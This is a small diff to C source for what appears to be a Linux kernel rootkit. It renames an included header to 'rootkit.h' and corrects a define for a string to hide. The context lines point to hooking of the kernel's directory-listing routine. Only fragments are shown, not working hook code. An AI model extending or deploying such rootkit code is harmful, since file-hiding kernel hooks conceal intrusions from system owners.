@@ -6,7 +6,7 @@
 #include <linux/syscalls.h>
 #include <linux/string.h>
 #include <linux/slab.h>
-#include "hook.c"
+#include "rootkit.h"
 
 #if defined(__i386__)
 #define START_CHECK 0xc0000000
@@ -18,7 +18,7 @@ typedef unsigned int psize;
 typedef unsigned long psize;
 #endif
 
-#define STRING_TO_HIDE = "hide_me_please"
+#define STRING_TO_HIDE "hide_me_please"
 
 psize *filldir;
 unsigned char* fill_dir_o_code;
